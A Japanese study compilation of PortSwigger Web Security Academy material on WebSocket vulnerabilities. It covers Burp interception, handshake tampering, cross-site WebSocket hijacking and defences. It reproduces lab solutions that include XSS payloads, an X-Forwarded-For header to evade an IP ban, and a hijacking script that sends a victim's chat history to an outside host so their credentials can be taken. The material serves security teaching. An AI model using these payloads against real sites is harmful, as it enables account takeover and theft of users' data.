# [43] WebSockets（PortSwigger Web Security Academy） — WebSockets のセキュリティ脆弱性テスト

## 取得状況

| URL | 状態 | 取得方法 | 備考 |
| --- | --- | --- | --- |
| https://portswigger.net/web-security/websockets | full（内容は逐語で完全再現） | portswigger.net は組織の egress ポリシーで**遮断（CONNECT 403）**。WebFetch も `EGRESS_BLOCKED`。→ GitHub の逐語ミラーを raw.githubusercontent.com から取得（複数リポジトリで相互照合） | 一次情報（原典サイト）へは直接アクセス不可。ただし 4 つの独立ミラー（apuromafo/Academia_Backup、musclebigger/cyber-security-knowledge-engine、qub1tt、Diekgbbtt/polyphemus）で本文が完全一致したため、本文・コードは原文と同一とみなせる |
| https://portswigger.net/web-security/websockets/what-are-websockets （サブページ） | full（内容は逐語で完全再現） | 同上（Diekgbbtt/polyphemus のフルダンプ＋musclebigger ミラーで一致） | ハンドシェイクのヘッダ（Upgrade / Sec-WebSocket-Key / Accept / Version）はここに記載。逐語で確保 |
| https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking （サブページ） | full（内容は逐語で完全再現） | 同上（musclebigger ミラー） | CSWSH の原理・影響・攻撃手順。原典本文には完全な PoC JS は含まれない（PoC はラボ解法にある）。PoC はコミュニティのラボ解法ミラー（sh3bu/Portswigger_labs）から取得し、出典を明記 |
| https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities （ラボ①） | full（ラボ説明＋**公式 Solution** を逐語取得） | musclebigger ミラー（web-security__websockets__lab-manipulating-messages-...md, 抓取 2026-09-05）。**本補完で新規取得** | ラボ課題文＋公式解法手順。「クライアントが `<` を送信前に HTML エンコードする」という重要な実装詳細を含む |
| https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities （ラボ②） | full（ラボ説明＋Hint＋**公式 Solution** を逐語取得） | 同上（web-security__websockets__lab-manipulating-handshake-...md）。**本補完で新規取得** | `X-Forwarded-For` による IP BAN 回避＋難読化 XSS ペイロード `<img src=1 oNeRrOr=alert\`1\`>` を含む具体的手順 |
| https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab （ラボ③ CSWSH） | full（ラボ説明＋Note＋**公式 Solution 12 手順** を逐語取得） | 同上（...__cross-site-websocket-hijacking__lab.md）。**本補完で新規取得**。CSWSH ラボの本文・解法は sh3bu/Portswigger_labs でも相互照合 | 公式 exploit テンプレート、「READY」でチャット履歴取得、被害者資格情報の窃取まで含む完全手順 |

> 補足（本補完セッション 2026-09-18）: 前工程で「一次サイトに直接触れられなかった（portswigger.net が egress 遮断）」ため confidence=medium だった。本補完でも **portswigger.net は依然 egress 遮断（WebFetch=EGRESS_BLOCKED / curl=000）**、**web.archive.org も 403 遮断**、**WebSearch も予算枯渇（200/200）** で一次サイトへは到達できず。ただし **raw.githubusercontent.com は到達可能**なので、前工程が取得していなかった**ラボ 3 ページ（説明＋公式 Solution）を新規取得**し、内容の厚みを大幅に増やした。原典 3 ページ本文は前工程どおり逐語で完全一致を再確認済み（musclebigger ミラーで再照合）。捏造なし。追加分はすべて出典（ミラーリポジトリ名・原典 URL）を明記。

## 要約（3〜10行）

- WebSocket は HTTP 上で開始され、双方向・全二重・長寿命の非同期通信を行うプロトコル。通常の HTTP で起きる脆弱性（XSS, SQLi, XXE 等）はほぼすべて WebSocket 通信でも起こり得る。
- テストの基本は「アプリが想定しない形にメッセージ／ハンドシェイクを改変する」こと。Burp Suite（Proxy で傍受・改変、Repeater で再送・生成・ハンドシェイク改変）が中核ツール。
- 入力起因の脆弱性の大半は「メッセージ本文の改ざん」で発見・悪用できる（例: チャットの `{"message":"..."}` に `<img src=1 onerror='alert(1)'>` を注入して XSS）。
- ハンドシェイク改変でしか見つからない脆弱性もある（`X-Forwarded-For` 等 HTTP ヘッダへの誤った信頼、セッション処理の欠陥、独自ヘッダの攻撃面）。
- **Cross-site WebSocket hijacking（CSWSH / cross-origin WebSocket hijacking）**は「WebSocket ハンドシェイクに対する CSRF」。ハンドシェイクがセッション管理を Cookie のみに依存し CSRF トークン等の予測不能値を持たないと成立。攻撃者ページが被害者セッションで双方向通信を奪取でき、通常の CSRF と違い**送信だけでなく受信（機密データ窃取）も可能**。
- 防御: `wss://`（TLS）を使う、エンドポイント URL をハードコードし利用者入力を混ぜない、ハンドシェイクを CSRF から保護、受信データを双方向とも untrusted として安全に処理。
- **3 つの公式ラボ（本補完で説明＋公式 Solution を新規収録＝節7）**: ①メッセージ改変で「クライアント側の `<` HTML エンコード」を Burp 傍受で回避し格納型 XSS。②ハンドシェイクに `X-Forwarded-For: 1.1.1.1` を足して IP BAN を回避し、難読化ペイロード `` <img src=1 oNeRrOr=alert`1`> `` でフィルタ突破。③CSWSH で exploit サーバ＋Collaborator により `READY`→チャット履歴（資格情報含む）を exfiltrate しアカウント乗っ取り。

---

## 詳細ノート

### 節1: Testing for WebSockets security vulnerabilities（トップ導入）（出典: /web-security/websockets）

原文冒頭:「In this section, we'll explain how to manipulate WebSocket messages and connections, describe the kinds of security vulnerabilities that can arise with WebSockets, and give some examples of exploiting WebSockets vulnerabilities.」

- この節では (1) WebSocket メッセージと接続の改変方法、(2) WebSocket に生じ得るセキュリティ脆弱性の種類、(3) 悪用例、を扱う（防御・診断目的の技術解説。許可された検証／バグバウンティ前提）。

#### WebSockets（概要）

- WebSocket は現代の Web アプリで広く使われる。**HTTP 上で開始され（initiated over HTTP）**、**長寿命の接続（long-lived connections）**を提供し、**双方向で非同期な通信（asynchronous communication in both directions）**を行う。
- 用途はユーザー操作の実行から機微情報の伝送まで多岐にわたる。**通常の HTTP で生じる Web セキュリティ脆弱性は、事実上すべて WebSocket 通信でも生じ得る（Virtually any web security vulnerability that arises with regular HTTP can also arise in relation to WebSockets communications）**。
- 「Read more」→ What are WebSockets?（/web-security/websockets/what-are-websockets）
- 「Labs」: 基本概念を既に理解していて演習だけしたい場合は、このトピックの全ラボを一覧から利用可能（View all WebSockets labs → /web-security/all-labs#websockets）。

### 節2: Manipulating WebSocket traffic（WebSocket トラフィックの改変）（出典: /web-security/websockets）

- WebSocket の脆弱性発見は一般に「アプリが想定しない方法で通信を改変する」ことで行う。これには **Burp Suite** を使う。
- Burp Suite でできること（3 つ、いずれもトップページ内アンカーへのリンク）:
  1. WebSocket メッセージの**傍受と改変**（Intercept and modify WebSocket messages）
  2. WebSocket メッセージの**再送と新規生成**（Replay and generate new WebSocket messages）
  3. WebSocket **接続の操作**（Manipulate WebSocket connections）

#### 2-1. Intercepting and modifying WebSocket messages（メッセージの傍受と改変）

Burp Proxy を使って次の手順で傍受・改変する:

1. Burp のブラウザ（Burp's browser）を開く。
2. WebSocket を使うアプリ機能にアクセスする。**Burp Proxy 内の「WebSockets history」タブ**にエントリが現れるかどうかで、WebSocket が使われているか判別できる。
3. Burp Proxy の Intercept タブで、傍受（interception）がオンになっていることを確認する。
4. ブラウザまたはサーバから WebSocket メッセージが送られると、Intercept タブに表示され、閲覧・改変できる。Forward ボタンでメッセージを転送する。

> #### Note（原文の注記）
> クライアント→サーバ方向とサーバ→クライアント方向のどちらのメッセージを傍受するかは Burp Proxy で設定できる。Settings ダイアログの **WebSocket interception rules** 設定（/burp/documentation/desktop/settings/tools/proxy#websocket-interception-rules）で行う。

#### 2-2. Replaying and generating new WebSocket messages（再送と新規メッセージ生成）

オンザフライの傍受・改変に加え、個々のメッセージの再送や新規メッセージ生成ができる。**Burp Repeater** を使う:

1. Burp Proxy の WebSockets history または Intercept タブでメッセージを選び、コンテキストメニューから「Send to Repeater」を選ぶ。
2. Burp Repeater で、選んだメッセージを編集し、何度でも送信できる。
3. 新しいメッセージを入力し、クライアント／サーバのどちらの方向にも送信できる。
4. Burp Repeater 内の「History」パネルで、その WebSocket 接続で送受信されたメッセージ履歴を閲覧できる。これには Repeater で生成したものだけでなく、同一接続でブラウザやサーバが生成したものも含まれる。
5. History パネル内の任意のメッセージを編集・再送したい場合は、メッセージを選んでコンテキストメニューから「Edit and resend」を選ぶ。

#### 2-3. Manipulating WebSocket connections（接続＝ハンドシェイクの操作）

- メッセージの改変に加え、接続を確立する **WebSocket ハンドシェイク**（/web-security/websockets/what-are-websockets#how-are-websocket-connections-established）自体を操作する必要が出る場合がある。
- ハンドシェイク改変が必要になる状況（3 つ）:
  1. より多くの攻撃面（attack surface）に到達できる場合がある。
  2. ある種の攻撃で接続が切れることがあり、新しい接続を張り直す必要がある。
  3. 元のハンドシェイクリクエスト中のトークンやデータが古く（stale）、更新が必要な場合がある。
- Burp Repeater でのハンドシェイク操作手順:
  1. 前述の要領で WebSocket メッセージを Burp Repeater に送る。
  2. Burp Repeater で、WebSocket URL の隣にある**鉛筆アイコン（pencil icon）**をクリックする。これでウィザードが開き、「既存の接続済み WebSocket にアタッチ」「接続済み WebSocket のクローン」「切断された WebSocket への再接続」を選べる。
  3. クローンまたは再接続を選ぶと、ウィザードは WebSocket ハンドシェイクリクエストの全詳細を表示し、ハンドシェイク実行前に必要に応じて編集できる。
  4. 「Connect」をクリックすると、Burp は設定したハンドシェイクを実行して結果を表示する。新しい WebSocket 接続の確立に成功すれば、それを使って Burp Repeater で新規メッセージを送れる。

### 節3: WebSockets security vulnerabilities（生じ得る脆弱性）（出典: /web-security/websockets）

原理上、事実上どんな Web セキュリティ脆弱性も WebSocket で生じ得る:

- サーバに送られる**ユーザー供給入力**が安全でない方法で処理され、**SQL インジェクション**や **XML 外部エンティティ（XXE）インジェクション**などにつながる可能性。
- WebSocket 経由で到達する**ブラインド脆弱性**の一部は、**out-of-band（OAST）技法**（https://portswigger.net/blog/oast-out-of-band-application-security-testing）でしか検出できないことがある。
- 攻撃者が制御するデータが WebSocket 経由で**他の利用者に伝送**される場合、**XSS その他のクライアントサイド脆弱性**につながる可能性。

#### 3-1. Manipulating WebSocket messages to exploit vulnerabilities（メッセージ改変による悪用）

- WebSocket に影響する入力起因の脆弱性の**大半は、WebSocket メッセージの内容を改ざんする（tampering with the contents of WebSocket messages）ことで発見・悪用できる**。
- 例: チャットアプリが WebSocket でブラウザ⇄サーバ間のチャットメッセージを送る。ユーザーがチャットを打つと、次のような WebSocket メッセージがサーバへ送られる:

  `{"message":"Hello Carlos"}`

  その内容は（同じく WebSocket 経由で）別のチャット利用者へ伝送され、利用者のブラウザでは次のように描画される:

  `<td>Hello Carlos</td>`

  他に入力処理や防御が無ければ、攻撃者は次の WebSocket メッセージを送ることで概念実証（PoC）XSS を実行できる:

  `{"message":"<img src=1 onerror='alert(1)'>"}`

- 関連ラボ: **APPRENTICE — Manipulating WebSocket messages to exploit vulnerabilities**（/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities）

#### 3-2. Manipulating the WebSocket handshake to exploit vulnerabilities（ハンドシェイク改変による悪用）

- 一部の WebSocket 脆弱性は、**WebSocket ハンドシェイクを操作すること**でしか発見・悪用できない。これらは設計上の欠陥（design flaws）を含む傾向があり、例として:
  1. **HTTP ヘッダへの誤った信頼**でセキュリティ判断を行う（例: `X-Forwarded-For` ヘッダ）。
  2. **セッション処理機構の欠陥**。WebSocket メッセージが処理されるセッションコンテキストは、一般に**ハンドシェイクメッセージのセッションコンテキストで決まる**ため。
  3. アプリが使う**独自 HTTP ヘッダ**によって導入される攻撃面。
- 関連ラボ: **PRACTITIONER — Manipulating the WebSocket handshake to exploit vulnerabilities**（/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities）

#### 3-3. Using cross-site WebSockets to exploit vulnerabilities（クロスサイト WebSocket による悪用）

- 一部の WebSocket 脆弱性は、攻撃者が制御する Web サイトから**クロスドメインの WebSocket 接続**を張ることで生じる。これを **cross-site WebSocket hijacking 攻撃**と呼び、**WebSocket ハンドシェイクに対する CSRF 脆弱性の悪用**を伴う。
- 影響は深刻になりがちで、攻撃者が被害者利用者になりすまして特権的操作を実行したり、被害者がアクセスできる機密データを窃取したりできる。
- 「Read more」→ Cross-site WebSockets hijacking（/web-security/websockets/cross-site-websocket-hijacking）

### 節4: How to secure a WebSocket connection（WebSocket 接続の安全化＝防御指針）（出典: /web-security/websockets）

WebSocket の脆弱性リスクを最小化するための指針（4 つ、逐語）:

1. **`wss://` プロトコル（TLS 上の WebSocket）を使う**（Use the `wss://` protocol (WebSockets over TLS)）。
2. WebSocket エンドポイントの URL を**ハードコードし、ユーザー制御可能なデータを URL に組み込まない**（Hard code the URL of the WebSockets endpoint, and certainly don't incorporate user-controllable data into this URL）。
3. **ハンドシェイクメッセージを CSRF から保護**し、cross-site WebSocket hijacking を防ぐ（Protect the WebSocket handshake message against CSRF, to avoid cross-site WebSockets hijacking vulnerabilities）。
4. WebSocket で受信したデータを**双方向とも untrusted として扱う**。サーバ側・クライアント側の双方でデータを安全に処理し、SQL インジェクションや XSS などの入力起因脆弱性を防ぐ（Treat data received via the WebSocket as untrusted in both directions...）。

---

### 節5: What are WebSockets?（サブページ）（出典: /web-security/websockets/what-are-websockets）

導入:「WebSockets are a bi-directional, full duplex communications protocol initiated over HTTP. They are commonly used in modern web applications for streaming data and other asynchronous traffic.」

- WebSocket は **HTTP 上で開始される双方向・全二重（bi-directional, full duplex）通信プロトコル**。ストリーミングデータやその他の非同期トラフィックのために現代の Web アプリで一般的に使われる。
- この節では (1) HTTP と WebSocket の違い、(2) WebSocket 接続の確立方法、(3) WebSocket メッセージの見た目、を説明する。

#### 5-1. What is the difference between HTTP and WebSockets?（HTTP と WebSocket の違い）

- ブラウザとサイト間の通信の大半は HTTP を使う。HTTP ではクライアントがリクエストを送り、サーバがレスポンスを返す。通常レスポンスは即座に起き、トランザクションは完了する。ネットワーク接続が開いたままでも、それは別個のリクエスト／レスポンストランザクションに使われる。
- 一部の現代サイトは WebSocket を使う。WebSocket 接続は **HTTP 上で開始され、典型的には長寿命（long-lived）**。メッセージはいつでもどちらの方向にも送れ、トランザクション的ではない。接続は通常、クライアントかサーバのどちらかがメッセージを送る準備ができるまで、開いたままアイドル状態を保つ。
- WebSocket は**低遅延（low-latency）**やサーバ発（server-initiated）メッセージが必要な状況（例: **金融データのリアルタイムフィード**）で特に有用。

#### 5-2. How are WebSocket connections established?（接続の確立方法）

- WebSocket 接続は通常、次のようなクライアントサイド JavaScript で作成する:

  `var ws = new WebSocket("wss://normal-website.com/chat");`

  > #### Note（原文の注記）
  > `wss` プロトコルは暗号化された TLS 接続上に WebSocket を確立し、`ws` プロトコルは暗号化されない接続を使う。

- 接続を確立するために、ブラウザとサーバは **HTTP 上で WebSocket ハンドシェイク**を行う。ブラウザは次のようなハンドシェイクリクエストを送る（**逐語**）:

```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

- サーバが接続を受け入れると、次のようなハンドシェイクレスポンスを返す（**逐語**）:

```http
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```

- この時点でネットワーク接続は開いたままとなり、どちらの方向にも WebSocket メッセージを送れる。

  > #### Note（原文の注記: ハンドシェイクメッセージの注目点）
  > - リクエストとレスポンス中の **`Connection` および `Upgrade` ヘッダ**は、これが WebSocket ハンドシェイクであることを示す。
  > - **`Sec-WebSocket-Version` リクエストヘッダ**は、クライアントが使いたい WebSocket プロトコルのバージョンを指定する。通常は **`13`**。
  > - **`Sec-WebSocket-Key` リクエストヘッダ**は Base64 エンコードされたランダム値を含み、ハンドシェイクリクエストごとにランダムに生成されるべき。
  > - **`Sec-WebSocket-Accept` レスポンスヘッダ**は、`Sec-WebSocket-Key` リクエストヘッダで送られた値に、プロトコル仕様で定義された特定の文字列を連結したもののハッシュを含む。これは、誤設定サーバやキャッシングプロキシによる誤解を招くレスポンスを防ぐために行われる。

〔補足（一般知識）〕原典の例には `Sec-WebSocket-Extensions` ヘッダは登場しない。実際の WebSocket ハンドシェイクでは `Sec-WebSocket-Extensions`（例: `permessage-deflate` 圧縮の交渉）や `Sec-WebSocket-Protocol`（サブプロトコル交渉）が現れることがある。`Sec-WebSocket-Accept` は RFC 6455 で、`Sec-WebSocket-Key` の値に固定 GUID `258EAFA5-E914-47DA-95CA-C5AB0DC85B11` を連結して SHA-1 を取り Base64 化して算出する（＝重点で問われた「特定の文字列」の正体）。この GUID・SHA-1 の詳細は PortSwigger の当該ページには明記されていないため補足として記載。

#### 5-3. What do WebSocket messages look like?（メッセージの見た目）

- 接続確立後は、クライアント／サーバのどちらからでも非同期にメッセージを送れる。
- ブラウザからのシンプルなメッセージ送信例（クライアントサイド JS、逐語）:

  `ws.send("Peter Wiener");`

- 原理上 WebSocket メッセージは任意の内容・データ形式を含み得る。現代のアプリでは構造化データの送信に **JSON** を使うのが一般的。
- 例: WebSocket を使うチャットボットアプリのメッセージ（逐語）:

  `{"user":"Hal Pline","content":"I wanted to be a Playstation growing up, not a device to answer your inane questions"}`

---

### 節6: Cross-site WebSocket hijacking（CSWSH）（サブページ）（出典: /web-security/websockets/cross-site-websocket-hijacking）

導入:「In this section, we'll explain cross-site WebSocket hijacking (CSWSH), describe the impact of a compromise, and spell out how to perform a cross-site WebSocket hijacking attack.」

- この節では CSWSH の説明、侵害の影響、CSWSH 攻撃の実行方法を扱う。

#### 6-1. What is cross-site WebSocket hijacking?（CSWSH とは）

- **Cross-site WebSocket hijacking（別名 cross-origin WebSocket hijacking）**は、**WebSocket ハンドシェイクに対する CSRF 脆弱性**を伴う。**ハンドシェイクリクエストがセッション管理を HTTP Cookie のみに依存し、CSRF トークンやその他の予測不能値を含まない**ときに発生する。
- 攻撃者は自ドメインに悪意あるページを作り、脆弱なアプリへ**クロスサイトの WebSocket 接続**を確立できる。アプリはその接続を**被害者利用者のセッションのコンテキスト**で処理してしまう。
- 攻撃者ページはその接続経由でサーバに**任意のメッセージを送信**でき、サーバから返るメッセージの内容を**読み取る**こともできる。つまり通常の CSRF と違い、攻撃者は侵害したアプリと**双方向（two-way）の対話**を得る。

#### 6-2. What is the impact of cross-site WebSocket hijacking?（影響）

CSWSH 攻撃の成功で、攻撃者はしばしば次が可能になる:

- **被害者になりすました不正操作の実行（Perform unauthorized actions masquerading as the victim user）**。通常の CSRF と同様、攻撃者はサーバサイドアプリに任意メッセージを送れる。アプリがクライアント生成の WebSocket メッセージで機微な操作を行うなら、攻撃者は適切なメッセージをクロスドメインで生成し、それらの操作を発火できる。
- **利用者がアクセスできる機密データの窃取（Retrieve sensitive data that the user can access）**。通常の CSRF と違い、CSWSH は乗っ取った WebSocket 越しに**双方向の対話**を与える。アプリがサーバ生成の WebSocket メッセージで機密データを利用者へ返すなら、攻撃者はそれらのメッセージを傍受して被害者のデータを捕捉できる。

#### 6-3. Performing a cross-site WebSocket hijacking attack（攻撃の実行）

- CSWSH は本質的に「WebSocket ハンドシェイク上の CSRF 脆弱性」なので、攻撃の第一歩は、アプリが行う **WebSocket ハンドシェイクを精査し、CSRF から保護されているかを判定**すること。
- CSRF 攻撃の通常条件（/web-security/csrf#how-does-csrf-work）に照らし、典型的には**セッション管理を HTTP Cookie のみに依存し、リクエストパラメータにトークン等の予測不能値を使っていないハンドシェイクメッセージ**を探す必要がある。
- 例: 次の WebSocket ハンドシェイクリクエストは、唯一のセッショントークンが Cookie で送られているため、**おそらく CSRF に脆弱**（逐語）:

```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

  > #### Note（原文の注記）
  > `Sec-WebSocket-Key` ヘッダはキャッシングプロキシによるエラーを防ぐためのランダム値を含むもので、**認証やセッション管理の目的には使われない**。

- ハンドシェイクリクエストが CSRF に脆弱なら、攻撃者ページはクロスサイトリクエストで脆弱サイト上の WebSocket を開ける。その後に何が起きるかは、アプリのロジックと WebSocket の使い方に完全に依存する。攻撃は次を伴い得る:
  - 被害者になりすまして不正操作を行うための WebSocket メッセージ送信。
  - 機密データを取得するための WebSocket メッセージ送信。
  - ときには、機密データを含む着信メッセージが届くのを待つだけ。

〔補足（一般知識・出典明記）〕原典の CSWSH 記事本文には完全な PoC JavaScript は含まれない（原理と手順のみ）。実際に PortSwigger ラボ「Cross-site WebSocket hijacking」を解く際に使う**標準的な PoC** は次の形（出典: コミュニティのラボ解法ミラー sh3bu/Portswigger_labs。教科書掲載時は「ラボ解法の代表例」と明示すること）。防御・診断目的の参考として記載:

```html
<script>
    var ws = new WebSocket('wss://your-lab-id.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-id.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

このスクリプトを exploit サーバに置いて配信すると、被害者ブラウザが同一オリジンの Cookie を自動付与してハンドシェイクを行い、`READY` 送信への応答としてサーバがチャット履歴（機密データ）を返し、それが `fetch` で Burp Collaborator（`oastify.com`）へ送出される。攻撃者は Collaborator の HTTP/DNS 相互作用ログから、例えば別ユーザー（carlos）のパスワードを含むメッセージ本文を回収できる。

〔補足（一般知識）〕このラボで観察される「同一オリジンの正常なハンドシェイク」には `Origin` ヘッダが含まれる（例: `Origin: https://<lab-id>.web-security-academy.net`）。CSWSH が成立するのは、サーバがハンドシェイク時に **`Origin` ヘッダを検証していない**（＝クロスオリジンからの接続を拒否しない）ためである。したがって**サーバ側での `Origin` ヘッダ検証**は CSWSH の主要な防御策の一つ（重点「Origin ヘッダ検証の重要性」に対応）。ただし `Origin` は攻撃者制御下の**サーバ間**リクエストでは偽装され得るため、`Origin` 検証だけに頼らず CSRF トークン等の予測不能値をハンドシェイクに含めることが推奨される。

---

## ラボ一覧（このトピック）

原文・関連ページから確認できるラボ（教科書の演習索引に転記可）:

| 難易度 | ラボ名 | パス | 課題（1 行） |
| --- | --- | --- | --- |
| APPRENTICE | Manipulating WebSocket messages to exploit vulnerabilities | /web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities | 傍受・改変でクライアント側 HTML エンコードを回避し、サポート担当者に格納型 XSS を発火 |
| PRACTITIONER | Manipulating the WebSocket handshake to exploit vulnerabilities | /web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities | `X-Forwarded-For` で IP BAN を回避＋難読化 XSS でフィルタ突破 |
| PRACTITIONER | Cross-site WebSocket hijacking（CSWSH ラボ） | /web-security/websockets/cross-site-websocket-hijacking/lab（**本補完でミラー取得・パス確定**） | exploit サーバ＋Collaborator でチャット履歴を窃取→資格情報でアカウント乗っ取り |

〔補足〕CSWSH ラボの URL は `/web-security/websockets/cross-site-websocket-hijacking/lab`（本補完でミラー取得により確定）。難易度ラベル自体はラボ本文に記載がなく、Academy の一覧ページ（/web-security/all-labs#websockets）で表示されるもの。上表の難易度は一般に流通する表記に基づく（PortSwigger 公式の一覧で最終確認を推奨）。各ラボの詳細な課題文・公式 Solution は上の「節7」に逐語で収録済み。

---

## 節7: 各ラボの課題文と公式 Solution（本補完で新規取得）

> 出典: musclebigger/cyber-security-knowledge-engine の PortSwigger Academy ミラー（`data/portswigger-academy/web-security__websockets__lab-*.md`、抓取 2026-09-05）。原典ラボページ（各 URL）の本文・公式 Solution を逐語で再現。CSWSH ラボ（ラボ③）は sh3bu/Portswigger_labs でも相互照合。**捏造なし**。ラボ環境そのもの（要ログイン・要 Burp）は取得不可のため、実際の演習は読者が原典で行うこと。

### ラボ①: Manipulating WebSocket messages to exploit vulnerabilities（メッセージ改変）

- **URL**: /web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities
- **課題文（逐語）**: このオンラインショップは WebSocket で実装されたライブチャット機能を持つ。送信したチャットメッセージはサポート担当者（support agent）がリアルタイムで閲覧する。**ラボを解くには、WebSocket メッセージを使ってサポート担当者のブラウザで `alert()` ポップアップを発火させる**。
- **公式 Solution（逐語・7 手順）**:
  1. 「Live chat」をクリックしてチャットメッセージを送る。
  2. Burp Proxy の **WebSockets history** タブで、チャットが WebSocket メッセージ経由で送られていることを確認する。
  3. ブラウザから `<` 文字を含む新しいメッセージを送る。
  4. Burp Proxy で対応する WebSocket メッセージを見つけ、**`<` がクライアント側で送信前に HTML エンコードされている**ことを確認する。
  5. Burp Proxy が WebSocket メッセージを傍受するよう設定した上で、もう 1 つチャットを送る。
  6. 傍受したメッセージを次のペイロードに編集する: `<img src=1 onerror='alert(1)'>`
  7. ブラウザで alert が発火することを確認する。これはサポート担当者のブラウザでも同様に起こる。
- **教訓（重点）**: クライアント側のサニタイズ（`<` の HTML エンコード）は **Burp でメッセージを傍受・改変すれば容易にバイパスできる**。クライアント側フィルタはセキュリティ境界にならない。サーバ／描画側で無害化しなければ格納型 XSS（他ユーザー＝サポート担当者のブラウザで発火）が成立する。

### ラボ②: Manipulating the WebSocket handshake to exploit vulnerabilities（ハンドシェイク改変）

- **URL**: /web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities
- **課題文（逐語）**: このオンラインショップは WebSocket 実装のライブチャットを持つ。**攻撃的だが欠陥のある XSS フィルタ（aggressive but flawed XSS filter）**を備える。ラボを解くには、WebSocket メッセージでサポート担当者のブラウザに `alert()` を発火させる。
- **Hint（逐語）**:
  - XSS フィルタのバイパスに苦労する場合は XSS ラボ（/web-security/cross-site-scripting）を参照。
  - **IP ベースの制限は `X-Forwarded-For` のような HTTP ヘッダでバイパスできることがある**。
- **公式 Solution（逐語・9 手順）**:
  1. 「Live chat」をクリックしてチャットを送る。
  2. Burp Proxy の WebSockets history タブでチャットが WebSocket 経由で送られているのを確認。
  3. メッセージを右クリック→「Send to Repeater」。
  4. 基本的な XSS ペイロード `<img src=1 onerror='alert(1)'>` を含むメッセージを Edit and resend する。
  5. 攻撃がブロックされ、**WebSocket 接続が切断される**ことを確認する。
  6. 「Reconnect」をクリックすると、**IP アドレスが BAN されているため再接続に失敗**することを確認する。
  7. ハンドシェイクリクエストに次のヘッダを追加して IP アドレスを偽装する: `X-Forwarded-For: 1.1.1.1`
  8. 「Connect」をクリックして WebSocket に再接続成功。
  9. 難読化した XSS ペイロードを含む WebSocket メッセージを送る: `` <img src=1 oNeRrOr=alert`1`> ``
- **教訓（重点）**: (a) ハンドシェイク改変（`X-Forwarded-For` 偽装）で **IP ベースの BAN／制限を回避**できる＝「HTTP ヘッダへの誤った信頼」の具体例。(b) XSS フィルタは**大文字小文字混在（`oNeRrOr`）やバッククォート呼び出し（`` alert`1` ``）などの難読化**で回避され得る。この 2 段（ハンドシェイクでアクセス回復＋メッセージで難読化 XSS）が本ラボの核心。

### ラボ③: Cross-site WebSocket hijacking（CSWSH）

- **URL**: /web-security/websockets/cross-site-websocket-hijacking/lab
- **課題文（逐語）**: このオンラインショップは WebSocket 実装のライブチャットを持つ。ラボを解くには、**exploit サーバに HTML/JavaScript ペイロードをホストし、cross-site WebSocket hijacking 攻撃で被害者のチャット履歴を窃取**し、それを使って被害者のアカウントにアクセスする。
- **Note（逐語）**: Academy プラットフォームが第三者攻撃に悪用されるのを防ぐため、ファイアウォールがラボと任意の外部システムとの通信をブロックしている。ラボを解くには、**提供された exploit サーバおよび／または Burp Collaborator のデフォルト公開サーバ**を使う必要がある。
- **公式 Solution（逐語・12 手順、要点）**:
  1. 「Live chat」でチャットを送る。
  2. ページをリロードする。
  3. Burp Proxy の WebSockets history タブで、**「READY」コマンドが過去のチャットメッセージをサーバから取得する**ことを確認する。
  4. HTTP history タブで WebSocket ハンドシェイクリクエストを見つけ、**CSRF トークンが無い**ことを確認する。
  5. ハンドシェイクリクエストを右クリック→「Copy URL」。
  6. exploit サーバの「Body」に**公式テンプレート**（下記）を貼る。
  7. `your-websocket-url` をハンドシェイク URL（`YOUR-LAB-ID.web-security-academy.net/chat`）に置換。**プロトコルを `https://` から `wss://` に変える**こと。`your-collaborator-url` を Burp Collaborator が生成したペイロードに置換。
  8. 「View exploit」をクリック（自分で動作確認）。
  9. Collaborator タブで相互作用をポーリングし、チャット履歴が Collaborator 経由で窃取されたことを確認する。チャットの各メッセージごとに Collaborator が HTTP リクエストを受信し、そのボディにチャット内容が JSON 形式で入る（順序は正しく届かないことがある）。
  10. exploit サーバに戻り、exploit を被害者に配信する（Deliver to victim）。
  11. 再び Collaborator をポーリングし、被害者のチャット履歴を含む HTTP 相互作用を受信。メッセージを調べると、**その 1 つに被害者のユーザー名とパスワードが含まれる**。
  12. 窃取した資格情報で被害者アカウントにログインする。
- **公式 exploit テンプレート（逐語。原典ラボ Solution 掲載のもの）**:

```html
<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

  > 上の「公式テンプレート」はプレースホルダが `your-websocket-url` / `your-collaborator-url`。前掲（節6-3 補足）の PoC は同一構造のコミュニティ版（プレースホルダが `your-lab-id...` / `oastify.com`）。両者は本質的に同一で、**この CSWSH の攻撃形は「READY 送信→サーバがチャット履歴を返す→onmessage で Collaborator へ exfiltrate」**という 1 点に集約される。
- **教訓（重点）**: (a) ハンドシェイクに CSRF トークンが無く Cookie のみでセッション管理していることが成立条件（HTTP history で確認）。(b) `"READY"` のような**サーバに機密データ（チャット履歴）を吐かせるトリガーメッセージ**を知ることが鍵。(c) 通常 CSRF と違い**受信（機密データ窃取）**まで可能で、実害は資格情報流出→アカウント乗っ取りに至る。(d) 防御は Origin 検証＋ハンドシェイクへの CSRF トークン付与（節6 補足参照）。

---

## 読者が自分で開くべき資料

